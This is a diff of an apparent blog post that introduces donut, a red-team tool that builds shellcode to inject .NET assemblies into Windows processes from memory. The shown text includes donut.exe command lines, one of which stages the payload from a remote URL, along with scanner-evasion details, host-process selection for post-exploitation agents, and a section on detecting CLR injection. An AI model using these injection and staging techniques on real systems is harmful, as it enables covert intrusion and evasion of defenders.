@@ -15,14 +15,14 @@ Before we begin, you must understand a few important components of .NET.
        <summary>Click to expand the primer!</summary>
        
 * [Common Language Runtime](https://docs.microsoft.com/en-us/dotnet/standard/clr "Common Language Runtime"): Like Java, .NET uses a runtime environment (or "virtual machine") to interpret code at runtime. All .NET Code is compiled from an intermediate language to native code "Just-In-Time" before execution.
-* [Common Intermediate Language](https://docs.microsoft.com/en-us/dotnet/standard/managed-code "Common Intermediate Language"): Speaking of an intermediate language, .NET uses CIL (also known as MSIL). All .NET languages (of which there are many) are "compiled" to this intermediate language. CIL is a generic object-oriented assembly language that can be interpreted into machine code for any hardware architecture. As such, the designers of .NET languages do not need to design their compilers around the architectures they will run on. Instead, they merely need to design it to compile to one language: CIL.
+* [Common Intermediate Language](https://docs.microsoft.com/en-us/dotnet/standard/managed-code "Common Intermediate Language"): Speaking of an intermediate language, .NET uses CIL (also known as MSIL). All .NET languages (of which there are many) are "assembled" to this intermediate language. CIL is a generic object-oriented assembly language that can be interpreted into machine code for any hardware architecture. As such, the designers of .NET languages do not need to design their compilers around the architectures they will run on. Instead, they merely need to design it to compile to one language: CIL.
 * [.NET Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/assemblies-in-the-common-language-runtime ".NET Assemblies"): .NET applications are packaged into .NET Assemblies. They are so called because the code from your language of choice has been "assembled" into CIL but not truly compiled. Assemblies use an extension of the PE format and are represented as either an EXE or a DLL that contains CIL rather than native machine code.
 * [Application Domains](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains "Application Domains"): Assemblies are run inside of a safe "box" known as an Application Domain. Multiple Assemblies can exist within an AppDomain, and multiple AppDomains can exist within a process. AppDomains are intended to provide the same level of isolation between executing Assemblies as is normally provided for processes. Threads may move between AppDomains and can share objects through marshalling and delegates.
 </details>
 
 ## Current state of .NET Tradecraft
 
-Currently, .NET tradecraft is limited to execution by one of two main ways:
+Currently, .NET tradecraft is limited to post-exploitation execution by one of two main ways:
 
 * Assembly.Load(): The .NET Framework's standard library includes an API for [code reflection](https://en.wikipedia.org/wiki/Reflection_(computer_programming)). This Reflection API includes System.Reflection.Assembly.Load, which can be used to load .NET programs from memory. In less than five lines of code, you may load a .NET DLL or EXE from memory and execute it.
 * execute-assembly: In Cobalt Strike 3.11, Raphael Mudge introduced a command called 'execute-assembly' that ran .NET Assemblies from memory as if they were run from disk. This command introduced the world to .NET tradecraft and signalled the shift to [Bringing Your Own Land](https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html).
@@ -47,10 +47,10 @@ The result is that execute-assembly *does* allow you to inject your .NET Assembl
 
 ## Moving Forward
 
-To move past these limitations, we need an technique that meets the following requirements:
+To move past these limitations, we need a technique that meets the following requirements:
 
 * Allows you to run .NET code from memory.
-* Can work with any Windows process, regardless of its architecture and current state.
+* Can work with any Windows process, regardless of its architecture and whether it has the CLR loaded.
 * Allows you to inject that code in either a remote (different) process or the local (current) process.
 * Allows you to determine in what way that injection occurs.
 * Works with multiple types of process injection.
@@ -77,7 +77,7 @@ To see a standalone example of an Unmanaged CLR Hosting Assembly loader, check o
 
 ## CLR Injection
 
-The first action that donut's shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly payload must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will be erased and then loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.
+The first action that donut's shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly payload must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.
 
 If the CLR is already loaded into the host process, then donut's shellcode will still work. The .NET Assembly will just be loaded into a new Application Domain within the managed process. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to run simultaneously in the same process. As such, your payload should always run no matter the process's state before injection.
 
@@ -139,7 +139,7 @@ The name of the AppDomain for your .NET payload may be specified manually using 
 .\donut.exe -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
 ```
 
-In order to reduce the size of your shellcode (or for many other reasons), you may spcecify a URL where your payload will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.
+In order to reduce the size of your shellcode (or for many other reasons), you may specify a URL where your payload will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.
 
 ```
 .\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
@@ -155,17 +155,17 @@ First, we will generate a x64 PIC using the SILENTTRINITY DLL. Using PowerShell,
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_generate_and_copy.png)
 
-Because we don't know what processes will be available to inject into on-target, we will also generate a x86 PIC. 
+Because we don't know what processes will be available to inject into on-target, we will also generate a x86 PIC just in case we need it. 
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ST_generate_and_copy_86.png)
 
-If you wanted to, you could use a staging server by providing the URL and copying the Donut Module to 
+If you wanted to, you could use a staging server by providing the URL and copying the Donut Module to the specified location.
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/generate_URL.png)
 
 ### Choosing a Host Process
 
-Use ProcessManager, a sub project, to enumerate processes. ProcessManager enumerates all running processesm and makes a best effort to obtain information about them. It is specifically designed to be used for determining what process to inject / migrate into. The picture below demonstrates its general usage.
+Use ProcessManager, a sub-project provided in the donut repo, to enumerate processes. ProcessManager enumerates all running processes and makes a best effort to obtain information about them. It is specifically designed to aid in determining what process to inject / migrate into. The picture below demonstrates its general usage.
 
 ![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/ProcessManager.jpg)
 
@@ -186,7 +186,7 @@ Now assume we already have an agent running on the machine. We can use SILENTTRI
 
 ## Using as a Library
 
-donut is provided as both dynamic and static libraries for both Linux (*.a* / *.so*) and Windows(*.lib* / *.dll*). It has a simple API that is described in *docs\api.html*. Two exported functions are provided, ``` int DonutCreate(PDONUT_CONFIG c) ``` and ``` int DonutDelete(PDONUT_CONFIG c) ``` .
+donut is provided as both dynamic and static libraries for both (*.a* / *.so*) and Windows (*.lib* / *.dll*). It has a simple API that is described in *docs\api.html*. Two exported functions are provided, ``` int DonutCreate(PDONUT_CONFIG c) ``` and ``` int DonutDelete(PDONUT_CONFIG c) ``` .
 
 ## Rebuilding the shellcode
 
@@ -236,7 +236,7 @@ Donut will also allow the developers of C2 Frameworks / RATs to add migrate-like
 
 ## Disposable AppDomains
 
-When donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the '-d' parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify payload.c to use the default domain. By running the payload in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain.
+When donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the '-d' parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify payload.c to use the default domain. By running the payload in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain. You could also modify the shellcode itself to perform that role.
 
 ## Detecting CLR Injection
 
@@ -249,7 +249,7 @@ While useful, there are both false positives and false negatives:
 * False Postiive: There are (few) legitimate uses of the Unmanaged CLR Hosting API. If there weren't, then Microsoft wouldn't have made it. CLR Sentry will notice every unmanaged program that loads the CLR.  
 * False Negatives: This will NOT notice injection of .NET code into processes that already have the CLR loaded. So, no use of the Reflection API and not when donut is used to inject shellcode into managed processes.
 
-Please Note: This is intended only as a Proof-of-Concept to demonstrate the anomalous behavior produced by CLR injection and how it may be detected. It should not be used in any way in a production environment.
+Please Note: This is intended **only** as a Proof-of-Concept to demonstrate the anomalous behavior produced by CLR injection and how it may be detected. It should not be used in any way in a production environment.
 
 I am not a defender, but the following pseudocode is my attempt at an analytic that follows this logic.
 
@@ -313,3 +313,5 @@ However, as I mentioned, this analytic fails to detect CLR Injection into proces
 4. Either way, inject / migrate into the process that is most likely to naturally produce network traffic and live the longest.
 
 # Conclusion
+
+Offensive .NET tradecraft is faced with several important challenges. One of them is the lack of means to inject into remote processes at will. While this can normally be performed with shellcode, there is no way to produce shellcode that can run a .NET Assembly directly on hardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common Language Runtime and load the Assembly through it. Enter Donut. With Donut, we now have a framework for generating flexible shellcode that loads a .NET Assembly from memory. This can be combined with existing techniques and tooling to advance tradecraft in a number of ways. Hopefully, this will break down the current barriers in .NET-based exploitation and provide tool designers with a foundation for crafting more excellent tools.
